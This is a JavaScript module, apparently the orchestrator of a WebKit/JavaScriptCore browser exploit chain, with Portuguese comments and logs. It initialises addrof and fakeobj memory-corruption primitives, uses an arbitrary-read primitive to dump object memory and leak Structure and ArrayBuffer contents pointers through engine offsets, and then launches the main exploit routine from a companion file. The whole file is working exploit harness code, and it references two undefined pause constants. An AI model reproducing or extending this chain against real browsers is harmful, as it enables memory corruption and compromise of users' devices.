// js/main.mjs

import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './script3/testArrayBufferVictimCrash.mjs'; // Importa a função principal da cadeia de exploração
import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs';
import { JSC_OFFSETS } from './config.mjs';
import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read, fakeobj_core } from './core_exploit.mjs';

// --- Local DOM Elements Management ---
const elementsCache = {};

function getElementById(id) {
    if (elementsCache[id] && document.body.contains(elementsCache[id])) {
        return elementsCache[id];
    }
    const element = document.getElementById(id);
    if (element) {
        elementsCache[id] = element;
    }
    return element;
}

// --- Local Logging Functionality ---
const outputDivId = 'output-advanced';

export const log = (message, type = 'info', funcName = '', phase = null) => {
    const outputDiv = getElementById(outputDivId);
    if (!outputDiv) {
        console.error(`Log target div "${outputDivId}" not found. Message: ${message}`);
        return;
    }
    try {
        const timestamp = `[${new Date().toLocaleTimeString()}]`;
        const prefix = funcName ? `[${funcName}] ` : '';
        const phasePrefix = phase !== null ? `(Fase ${phase}) ` : ''; // Adicionado prefixo de fase

        const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
        const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'debug'].includes(type) ? type : 'info';

        if (outputDiv.innerHTML.length > 600000) {
            const lastPart = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 300000);
            outputDiv.innerHTML = `<span class="log-info">[${new Date().toLocaleTimeString()}] [Log Truncado...]</span>\n` + lastPart;
        }

        outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${phasePrefix}${sanitizedMessage}\n</span>`;
        outputDiv.scrollTop = outputDiv.scrollHeight;
    } catch (e) {
        console.error(`Error in logToDiv for ${outputDivId}:`, e, "Original message:", message);
        if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
    }
};

// --- Local Pause Functionality ---
const SHORT_PAUSE = 50;
const MEDIUM_PAUSE = 500;
const LONG_PAUSE = 1000;

const PAUSE = async (ms = SHORT_PAUSE) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

// --- JIT Behavior Test ---
async function testJITBehavior() {
    log("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    log("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new AdvancedInt64(low, high);

    log(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');

    if (high === 0x7ff80000 && low === 0) {
        log("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        log("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
    }
    log("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
}

// --- Teste Isolado da Primitiva addrof_core e fakeobj_core com objeto simples e DUMP DE MEMÓRIA (AGORA COM UINT8ARRAY) ---
// Esta função define um teste isolado que valida as primitivas básicas de addrof/fakeobj e o setup da L/E universal.
// Não é a função principal da cadeia de exploração.
async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME = 'testIsolatedAddrofFakeobjCoreAndDump';
    logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core / fakeobj_core, leitura de Structure*, e DUMP DE MEMÓRIA de UINT8ARRAY ---`, 'test', FNAME, 0); // Fase 0

    let addrof_success = false;
    let fakeobj_success = false;
    let rw_test_on_fakeobj_success = false;
    let structure_ptr_found = false;
    let contents_ptr_leaked = false;

    try {
        logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME, 0);
        initCoreAddrofFakeobjPrimitives();
        await pauseFn(SHORT_PAUSE);

        // --- Criar um Uint8Array para o dump e teste ---
        const DUMP_ARRAY_SIZE = 0x1000; // 4KB para ter um m_vector alocado no heap
        const test_uint8_array_to_dump = new Uint8Array(DUMP_ARRAY_SIZE);
        for (let i = 0; i < DUMP_ARRAY_SIZE; i++) {
            test_uint8_array_to_dump[i] = (i % 255); // Preencher com um padrão previsível
        }
        logFn(`Criado Uint8Array de teste para dump (tamanho ${DUMP_ARRAY_SIZE} bytes) e preenchido com padrão.`, 'info', FNAME, 0);
        await pauseFn(SHORT_PAUSE);

        logFn(`Obtendo endereço do Uint8Array de teste para dump usando addrof_core...`, 'info', FNAME, 0);
        const uint8_array_addr = addrof_core(test_uint8_array_to_dump);
        logFn(`Endereço retornado por addrof_core (untagged, do Uint8Array): ${uint8_array_addr.toString(true)}`, 'leak', FNAME, 0);

        if (uint8_array_addr.equals(AdvancedInt64.Zero) || uint8_array_addr.equals(AdvancedInt64.NaNValue)) {
            logFn(`ERRO: addrof_core retornou endereço inválido para test_uint8_array_to_dump.`, "error", FNAME, 0);
            throw new Error("addrof_core returned invalid address for Uint8Array.");
        }
        addrof_success = true;

        // --- DUMP DE MEMÓRIA DO UINT8ARRAY ---
        logFn(`--- INICIANDO DUMP DE MEMÓRIA do Uint8Array em ${uint8_array_addr.toString(true)} ---`, "subtest", FNAME, 1); // Fase 1
        const DUMP_SIZE = 0x100; // Dump 256 bytes do início do Uint8Array
        let dump_log = `\n--- DUMP DO UINT8ARRAY EM ${uint8_array_addr.toString(true)} ---\n`;
        dump_log += `Offset    Hex (64-bit)       Decimal (Low) Hex (32-bit Low) Hex (32-bit High) Content Guess\n`;
        dump_log += `-------- -------------------- ------------- ------------------ ------------------ -------------------\n`;

        for (let offset = 0; offset < DUMP_SIZE; offset += 8) {
            try {
                const current_read_addr = uint8_array_addr.add(offset);
                const val = await arb_read(current_read_addr, 8); // Usando arb_read (old) aqui
                let guess = "";

                if (isAdvancedInt64Object(val)) {
                    if (val.equals(AdvancedInt64.Zero)) {
                        guess = "Zero/Null";
                    } else if (val.high() === 0x7ff80000 && val.low() === 0) {
                        guess = "NaN (JS Empty)";
                    } else {
                        if (offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
                            guess = `*** JSCell Structure* PTR (expected 0x8) ***: ${val.toString(true)}`;
                            if (!val.equals(AdvancedInt64.Zero) && !val.equals(AdvancedInt64.NaNValue)) structure_ptr_found = true;
                        } else if (offset === JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET) {
                            guess = `*** ABView ASSOCIATED_ARRAYBUFFER PTR (expected 0x8) ***: ${val.toString(true)}`;
                            if (!val.equals(AdvancedInt64.Zero) && !val.equals(AdvancedInt64.NaNValue)) contents_ptr_leaked = true;
                        } else if (offset === JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET) {
                            guess = `*** ABView M_VECTOR PTR (expected 0x10) ***: ${val.toString(true)}`;
                            if (!val.equals(AdvancedInt64.Zero) && !val.equals(AdvancedInt64.NaNValue)) contents_ptr_leaked = true;
                        } else if (offset === JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET) {
                            guess = `ABView M_LENGTH (expected 0x18): ${val.low()}`;
                        } else if (val.low() === test_uint8_array_to_dump[offset]) {
                            guess = `Raw Data Byte (0x${test_uint8_array_to_dump[offset].toString(16)})`;
                        } else if ((val.high() & 0xFFFF0000) === 0x402A0000 || (val.high() & 0xFFFF0000) === 0x001D0000) {
                            const potential_obj_ptr = new AdvancedInt64(val.low(), val.high() & 0x0000FFFF);
                            guess = `JSValue (Tagged Ptr to ${potential_obj_ptr.toString(true)})`;
                        } else if (val.high() === 0x405E0000 && val.low() === 0x4d2c8f5c) {
                            guess = `Float64: ${val.toNumber()}`;
                        }
                    }
                } else {
                    guess = `Non-Int64 (Typeof: ${typeof val}): ${String(val)}`;
                }

                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ${val.toString(true).padStart(19, ' ')} ${String(val.low()).padStart(13, ' ')} 0x${val.low().toString(16).padStart(8,'0')} 0x${val.high().toString(16).padStart(8,'0')} ${guess}\n`;

            } catch (e_dump) {
                dump_log += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ERROR in arb_read: ${e_dump.message}\n`;
                logFn(`[${FNAME}] ERRO durante dump no offset 0x${offset.toString(16)}: ${e_dump.message}`, "error", FNAME, 1);
            }
        }
        logFn(dump_log, 'leak', FNAME, 1);
        logFn(`--- FIM DO DUMP DE MEMÓRIA ---`, "subtest", FNAME, 1);
        await pauseFn(LOCAL_LONG_PAUSE * 2);

        // --- Avaliar os ponteiros da Structure e Contents do Uint8Array ---
        logFn(`Avaliando resultados de leitura para Uint8Array...`, "info", FNAME, 2); // Fase 2

        // Tentar ler o ponteiro da Structure* do Uint8Array no offset esperado (0x8)
        logFn(`Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do Uint8Array...`, "info", FNAME, 2);
        const structure_ptr_uint8_array_addr = uint8_array_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
        const structure_ptr_uint8_array_val = await arb_read(structure_ptr_uint8_array_addr, 8); // AQUI USANDO arb_read (old)
        logFn(`Valor lido no offset da Structure* do Uint8Array: ${structure_ptr_uint8_array_val.toString(true)}`, "leak", FNAME, 2);
        if (!structure_ptr_uint8_array_val.equals(AdvancedInt64.Zero) && !structure_ptr_uint8_array_val.equals(AdvancedInt64.NaNValue)) {
            logFn(`SUCESSO PARCIAL: Ponteiro da Structure* do Uint8Array NÃO É ZERO/NaN.`, "good", FNAME, 2);
            structure_ptr_found = true;
        } else {
            logFn(`ALERTA: Ponteiro da Structure* do Uint8Array LIDO COMO ZERO/NaN.`, "warn", FNAME, 2);
            structure_ptr_found = false;
        }

        // Tentar ler o ponteiro ASSOCIATED_ARRAYBUFFER_OFFSET (0x8) ou M_VECTOR_OFFSET (0x10) do Uint8Array
        logFn(`Tentando ler ASSOCIATED_ARRAYBUFFER_OFFSET (0x${JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET.toString(16)}) do Uint8Array...`, "info", FNAME, 2);
        const associated_arraybuffer_ptr_addr = uint8_array_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET);
        const associated_arraybuffer_ptr_val = await arb_read(associated_arraybuffer_ptr_addr, 8); // AQUI USANDO arb_read (old)
        logFn(`Valor lido do ASSOCIATED_ARRAYBUFFER_OFFSET: ${associated_arraybuffer_ptr_val.toString(true)}`, "leak", FNAME, 2);

        if (!associated_arraybuffer_ptr_val.equals(AdvancedInt64.Zero) && !associated_arraybuffer_ptr_val.equals(AdvancedInt64.NaNValue)) {
            logFn(`SUCESSO PARCIAL: Ponteiro ASSOCIATED_ARRAYBUFFER_OFFSET do Uint8Array NÃO É ZERO/NaN.`, "good", FNAME, 2);
            contents_ptr_leaked = true;

            logFn(`Tentando ler CONTENTS_IMPL_POINTER_OFFSET (0x${JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET.toString(16)}) do ArrayBuffer (apontado por ASSOCIATED_ARRAYBUFFER_OFFSET)...`, "info", FNAME, 2);
            const contents_impl_ptr_from_arraybuffer_addr = associated_arraybuffer_ptr_val.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
            const contents_impl_ptr_val = await arb_read(contents_impl_ptr_from_arraybuffer_addr, 8); // AQUI USANDO arb_read (old)
            logFn(`Valor lido do CONTENTS_IMPL_POINTER_OFFSET do ArrayBuffer: ${contents_impl_ptr_val.toString(true)}`, "leak", FNAME, 2);

            if (!contents_impl_ptr_val.equals(AdvancedInt64.Zero) && !contents_impl_ptr_val.equals(AdvancedInt64.NaNValue)) {
                logFn(`SUCESSO CRÍTICO: Ponteiro CONTENTS_IMPL_POINTER_OFFSET do ArrayBuffer NÃO É ZERO/NaN! Este é o ponteiro para os dados reais do ArrayBuffer! (Lido via OLD ARB R/W)`, "vuln", FNAME, 2);
                logFn(`Verificando o primeiro byte do conteúdo real do ArrayBuffer (esperado ${toHex(test_uint8_array_to_dump[0])})...`, "info", FNAME, 2);
                const first_byte_val = await arb_read(contents_impl_ptr_val, 1); // AQUI USANDO arb_read (old)
                if (first_byte_val === test_uint8_array_to_dump[0]) {
                    logFn(`SUCESSO: Leitura de dados brutos do ArrayBuffer via old_arb_read CORRETA! (Valor: ${toHex(first_byte_val)})`, "good", FNAME, 2);
                } else {
                    logFn(`FALHA: Leitura de dados brutos do ArrayBuffer INCORRETA! Lido: ${toHex(first_byte_val)}, Esperado: ${toHex(test_uint8_array_to_dump[0])}.`, "error", FNAME, 2);
                }
            } else {
                logFn(`ALERTA: Ponteiro CONTENTS_IMPL_POINTER_OFFSET do ArrayBuffer LIDO COMO ZERO/NaN.`, "warn", FNAME, 2);
            }
        } else {
            logFn(`ALERTA: Ponteiro ASSOCIATED_ARRAYBUFFER_OFFSET do Uint8Array LIDO COMO ZERO/NaN.`, "warn", FNAME, 2);
        }

        // --- Verificação funcional de fakeobj_core (usando um objeto JS simples, re-confirmando) ---
        logFn(`Realizando verificação funcional de addrof/fakeobj_core com um objeto JS simples (re-confirmando).`, "subtest", FNAME, 3); // Fase 3
        const test_object_simple_verify = { prop_a: 0xAAAA, prop_b: 0xBBBB };
        const test_object_simple_verify_addr = addrof_core(test_object_simple_verify);
        const faked_object_simple_verify = fakeobj_core(test_object_simple_verify_addr);
        if (faked_object_simple_verify && typeof faked_object_simple_verify === 'object') {
            fakeobj_success = true;
            faked_object_simple_verify.prop_a = 0xDEC0DE00;
            if (test_object_simple_verify.prop_a === 0xDEC0DE00) {
                logFn(`SUCESSO: Leitura/Escrita via fakeobj para objeto JS simples confirmada.`, "good", FNAME, 3);
                rw_test_on_fakeobj_success = true;
            } else {
                logFn(`FALHA: Leitura/Escrita via fakeobj para objeto JS simples falhou.`, "error", FNAME, 3);
            }
        } else {
            logFn(`FALHA: Criação de fakeobj para objeto JS simples falhou.`, "error", FNAME, 3);
        }
        await pauseFn(LOCAL_SHORT_PAUSE);


    } catch (e) {
        logFn(`ERRO CRÍTICO no teste isolado de addrof/fakeobj_core e dump de memória: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
        addrof_success = false;
        fakeobj_success = false;
        rw_test_on_fakeobj_success = false;
    } finally {
        logFn(`--- Teste Isolado da Primitiva addrof_core / fakeobj_core e Dump de Memória Concluído ---`, "test", FNAME);
        logFn(`Resultados: Addrof OK: ${addrof_success}, Fakeobj Criação OK: ${fakeobj_success}, L/E via Fakeobj (obj simples) OK: ${rw_test_on_fakeobj_success}, Structure* Ponteiro Encontrado (Uint8Array, no offset 0x8): ${structure_ptr_found}, Conteúdo/m_vector Ponteiro Vazado (Uint8Array): ${contents_ptr_leaked}`, "info", FNAME);
    }
    return rw_test_on_fakeobj_success;
}


// A função runHeisenbugReproStrategy_TypedArrayVictim_R43 é a função principal da cadeia de exploração,
// que será chamada pelo orquestrador (main.mjs). Ela está definida em testArrayBufferVictimCrash.mjs.
// O corpo desta função não deve estar aqui em main.mjs.

// --- Initialization Logic ---
function initializeAndRunTest() {
    const runBtn = getElementById('runIsolatedTestBtn');
    const outputDiv = getElementById('output-advanced');

    // Set the log function in utils.mjs so core_exploit.mjs can use it
    setLogFunction(log);

    if (!outputDiv) {
        console.error("DIV 'output-advanced' not found. Log will not be displayed on the page.");
    }

    if (runBtn) {
        runBtn.addEventListener('click', async () => {
            if (runBtn.disabled) return;
            runBtn.disabled = true;

            if (outputDiv) {
                outputDiv.innerHTML = ''; // Clear previous logs
            }
            console.log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...");
            log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...", 'test', null, 0); // Fase 0

            try {
                // Execute JIT test first
                log("--- Teste de Comportamento do JIT ---", 'test', 'main', 0.1); // Sub-fase
                await testJITBehavior();
                await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log

                // Teste isolado das primitivas addrof_core e fakeobj_core com dump de memória
                log("--- Teste Isolado das Primitivas Addrof/Fakeobj e Dump de Memória ---", 'test', 'main', 0.2); // Sub-fase
                const addrof_fakeobj_dump_test_passed = await testIsolatedAddrofFakeobjCoreAndDump(log, PAUSE, JSC_OFFSETS);
                if (!addrof_fakeobj_dump_test_passed) {
                    log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", 'critical', 'main', 0.3); // Sub-fase
                    runBtn.disabled = false;
                    return;
                }
                log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória concluído com sucesso. Prosseguindo para a cadeia principal.", 'good', 'main', 0.4); // Sub-fase
                await PAUSE(LONG_PAUSE * 2); // Pausa mais longa para revisar logs do dump

                // Then run the main exploit strategy (executeTypedArrayVictimAddrofAndWebKitLeak_R43)
                log("--- Iniciando Cadeia Principal de Exploração (Fase 4) ---", 'test', 'main', 1); // Nova fase
                await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS);
            } catch (e) {
                console.error("Critical error during isolated test execution:", e);
                log(`[CRITICAL TEST ERROR] ${String(e.message).replace(/</g, "&lt;").replace(/>/g, "&gt;")}\n`, 'critical', 'main', 'ERROR');
            } finally {
                console.log("Isolated test concluded.");
                log("Isolated test finished. Check the console for more details, especially if the browser crashed or a RangeError occurred.\n", 'test', 'main', 'DONE');
                runBtn.disabled = false;
                if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43L Done`;
                }
            }
        });
    } else {
        console.error("Button 'runIsolatedTestBtn' not found.");
    }
}

// Ensure DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeAndRunTest);
} else {
    initializeAndRunTest();
}
